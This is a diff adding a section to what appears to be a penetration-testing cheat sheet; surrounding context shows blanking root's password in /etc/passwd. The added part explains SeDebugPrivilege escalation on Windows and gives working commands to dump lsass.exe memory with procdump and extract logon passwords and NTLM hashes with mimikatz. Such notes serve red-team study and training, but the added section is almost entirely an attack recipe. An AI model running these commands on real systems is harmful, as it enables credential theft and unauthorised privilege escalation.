@@ -333,6 +333,19 @@ root:x:0:0:root:/root:/bin/bash (x means password is stored)
 root::0:0:root:/root:/bin/bash (password is not stored)
 ```
 #su (get root user)
+_________________________________________________________________________________________________________________________________________________________________________________________
+Sedebug Enable privilege escalaton
+-----------------------------------
+When SeDebugPrivilege is enabled, you can: 
 
+1.Open any process with full access (PROCESS_ALL_ACCESS)
+2.Read/write another process’s memory
+3.Inject code into processes
+4.Access protected processes like lsass.exe, winlogon.exe
 
-
+>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+>mimikatz.exe
+mimikatz # log
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords  (You can see NTLM hash)
+_________________________________________________________________________________________________________________________________________________________________________________________
